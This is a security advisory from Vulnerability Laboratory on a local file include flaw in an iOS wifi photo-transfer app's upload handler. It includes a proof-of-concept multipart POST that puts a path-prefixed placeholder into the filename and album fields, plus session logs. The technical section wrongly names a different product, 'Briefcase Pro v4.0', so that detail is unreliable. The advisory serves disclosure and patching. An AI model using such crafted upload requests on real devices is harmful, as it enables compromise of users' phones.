Document Title:
===============
GS Foto Uebertraeger v3.0 iOS - File Include Vulnerability


References (Source):
====================
http://www.vulnerability-lab.com/get_content.php?id=1325


Release Date:
=============
2014-09-22


Vulnerability Laboratory ID (VL-ID):
====================================
1325


Common Vulnerability Scoring System:
====================================
6.3


Product & Service Introduction:
===============================
The best Photo Transfer app on the App Store!Photo Transfer allows you to quickly transfer photos between your iPhone,
iPad, PC or Mac using your local Wi-Fi network, without any 3rd party transfer utilities. It can easily access your photo
libraries via wifi from any computer with a web browser(IE/Chrome/Safari) on the same wifi network, very easy to use!

(Copy of the Homepage: https://itunes.apple.com/en/app/wifi-fotos-ubertrager-+-uber/id902267412 )



Abstract Advisory Information:
==============================
The Vulnerability Laboratory Research Team discovered a file include vulnerability in the official Golden Soft Photo/Foto Uebertraeger v3.0 iOS mobile application.


Vulnerability Disclosure Timeline:
==================================
2014-09-22: Public Disclosure (Vulnerability Laboratory)


Discovery Status:
=================
Published


Affected Product(s):
====================
Golden Soft
Product: Foto �bertr�ger - iOS Mobile Web Application 3.0


Exploitation Technique:
=======================
Local


Severity Level:
===============
High


Technical Details & Description:
================================
A local file include web vulnerability has been discovered in the official Briefcase Pro v4.0 iOS mobile wifi web-application.
The local file include web vulnerability allows remote attackers to unauthorized include local file/path requests or system
specific path commands to compromise the mobile web-application.

The web vulnerability is located in the `filename and albumname` values of the `uploadPhotoPost` module. Remote attackers are able to inject
own files with malicious `filename or albumname` values in the `uploadPhotoPost` POST method request to compromise the mobile web-application.
The local file/path include execution occcurs in the index dir listing of the wifi interface context. The attacker is able to inject the local
file include request by usage of the `wifi interface` in connection with the vulnerable upload request.

Remote attackers are also able to exploit the filename/albumname validation issue in combination with persistent injected script codes to execute
different local malicious attacks requests. The attack vector is on the application-side of the wifi service and the request method to inject is POST.

The security risk of the local file include web vulnerability is estimated as high with a cvss (common vulnerability scoring system) count of 6.3.
Exploitation of the local file include web vulnerability requires no user interaction or privileged web-application user account. Successful exploitation
of the local file include web vulnerability results in mobile application or connected device component compromise.


Request Method(s):
				[+] [POST]

Vulnerable Module(s):
				[+] uploadPhotoPost

Vulnerable Parameter(s):
				[+] filename & albumname

Affected Module(s):
				[+] Index Path Dir Listing (http://localhost/)


Proof of Concept (PoC):
=======================
The local file include web vulnerability can be exploited by local wifi attackers in the network without privileged application user account or user interaction.
For security demonstration or to reproduce the security vulnerability follow the provided information or steps below to continue.


PoC: Url
http://localhost/./[LOCAL FILE INCLUDE VULNERABILITY VIA FILENAME VALUE!]


PoC: Exploit Photo Transfer.htm

<div class="album-title">>"./[LOCAL FILE INCLUDE VULNERABILITY VIA FILENAME VALUE!].png</div>
<a href="/group/1/0/100"><img class="album-overlay" alt="" width="140" height="160" src="/cvab-overlay.png">
<img class="album-thumb" width="90" height="90" alt="" src="/api/group/poster/1">                                    </a>
                       <!-- <div class="album-folder-img"><img alt="" width="140" height="160" src="/cvab.png"></div> -->
                    </div>
                </div>
            </div>
            <!--end of preview thumbnails -->
        </div>
        <!-- end of wrapper-->
        <div id="upload" class="wrapper">
            <div id="intro">
                <div class="col-1 padding-t20">
                    <!-- <h1><a href="/uploadPage"><img src="/upload.png" alt="" width="76" height="76"><br><br> -->
                    <!-- UPLOAD</a></h1> -->
                    <!-- <h2 class="center">Photos FROM This Computer</h2> -->
                </div>
            </div>
        </div>
        <!-- end of wrapper-->
        <div id="container">
            <div id="bg">
            </div>
        </div>
        <!-- end of container and background-->
        <div class="menu-bg ui-dark rad-0 center">
            <div class="logo">
                <a href="/groups">Photo Transfer +</a></div>
        </div>
        <!-- menu -->
    </body>
</html>
</iframe></div>



--- PoC Session Logs [POST] ---
Status: 200[OK]
POST http://localhost/uploadPhotoPost Load Flags[LOAD_BYPASS_CACHE  ] Gr��e des Inhalts[7] Mime Type[application/x-unknown-content-type]
   Request Header:
      Host[localhost]
      User-Agent[Mozilla/5.0 (Windows NT 6.3; WOW64; rv:32.0) Gecko/20100101 Firefox/32.0]
      Accept[text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8]
      Accept-Language[de,en-US;q=0.7,en;q=0.3]
      Accept-Encoding[gzip, deflate]
      Referer[http://localhost/uploadpage]
      Content-Length[818]
      Content-Type[multipart/form-data; boundary=---------------------------4611772826829]
      Cookie[plupload_ui_view=thumbs]
      Connection[keep-alive]
      Pragma[no-cache]
      Cache-Control[no-cache]
   POST-Daten:
      POST_DATA[-----------------------------4611772826829
Content-Disposition: form-data; name="name"

./[LOCAL FILE INCLUDE VULNERABILITY VIA FILENAME VALUE!].png
-----------------------------4611772826829
Content-Disposition: form-data; name="file"; filename="./[LOCAL FILE INCLUDE VULNERABILITY VIA FILENAME VALUE!].png"
Content-Type: image/png


Status: 200[OK]
GET http://localhost/main/home Load Flags[LOAD_DOCUMENT_URI  LOAD_INITIAL_DOCUMENT_URI  ] Gr��e des Inhalts[210] Mime Type[application/x-unknown-content-type]
   Request Header:
      Host[localhost]
      User-Agent[Mozilla/5.0 (Windows NT 6.3; WOW64; rv:32.0) Gecko/20100101 Firefox/32.0]
      Accept[text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8]
      Accept-Language[de,en-US;q=0.7,en;q=0.3]
      Accept-Encoding[gzip, deflate]
      Referer[http://localhost/uploadpage]
      Cookie[plupload_ui_view=thumbs]
      Connection[keep-alive]
   Response Header:
      Accept-Ranges[bytes]
      Content-Length[210]
      Connection[keep-alive]
      Date[Tue, 16 Sep 2014 15:07:38 GMT]



Solution - Fix & Patch:
=======================
The security vulnerability can be patched by a secure parse and encode of the file name value in the upload POST method request or sync.
Encode the file dir listing names and data output values to prevent further file include attacks. Restrict the file name extension validation
to fully secure the upload mechanism.


Security Risk:
==============
The security risk of the local file include web vulnerability in the filename value of the application is estimated as high.


Credits & Authors:
==================
Vulnerability Laboratory [Research Team] - Benjamin Kunz Mejri (bkm@evolution-sec.com) [www.vulnerability-lab.com]


Disclaimer & Information:
=========================
The information provided in this advisory is provided as it is without any warranty. Vulnerability Lab disclaims all warranties, either
expressed or implied, including the warranties of merchantability and capability for a particular purpose. Vulnerability-Lab or its suppliers
are not liable in any case of damage, including direct, indirect, incidental, consequential loss of business profits or special damages, even
if Vulnerability-Lab or its suppliers have been advised of the possibility of such damages. Some states do not allow the exclusion or limitation
of liability for consequential or incidental damages so the foregoing limitation may not apply. We do not approve or encourage anybody to break
any vendor licenses, policies, deface websites, hack into databases or trade with fraud/stolen material.

Domains:    www.vulnerability-lab.com   	- www.vuln-lab.com			       		- www.evolution-sec.com
Contact:    admin@vulnerability-lab.com 	- research@vulnerability-lab.com 	       		- admin@evolution-sec.com
Section:    dev.vulnerability-db.com	 	- forum.vulnerability-db.com 		       		- magazine.vulnerability-db.com
Social:	    twitter.com/#!/vuln_lab 		- facebook.com/VulnerabilityLab 	       		- youtube.com/user/vulnerability0lab
Feeds:	    vulnerability-lab.com/rss/rss.php	- vulnerability-lab.com/rss/rss_upcoming.php   		- vulnerability-lab.com/rss/rss_news.php
Programs:   vulnerability-lab.com/submit.php  	- vulnerability-lab.com/list-of-bug-bounty-programs.php	- vulnerability-lab.com/register/

Any modified copy or reproduction, including partially usages, of this file requires authorization from Vulnerability Laboratory. Permission to
electronically redistribute this alert in its unmodified form is granted. All other rights, including the use of other media, are reserved by
Vulnerability-Lab Research Team or its suppliers. All pictures, texts, advisories, source code, videos and other information on this website
is trademark of vulnerability-lab team & the specific authors or managers. To record, list (feed), modify, use or edit our material contact
(admin@vulnerability-lab.com or research@vulnerability-lab.com) to get a permission.

				Copyright � 2014 | Vulnerability Laboratory [Evolution Security]


--
VULNERABILITY LABORATORY RESEARCH TEAM
DOMAIN: www.vulnerability-lab.com
CONTACT: research@vulnerability-lab.com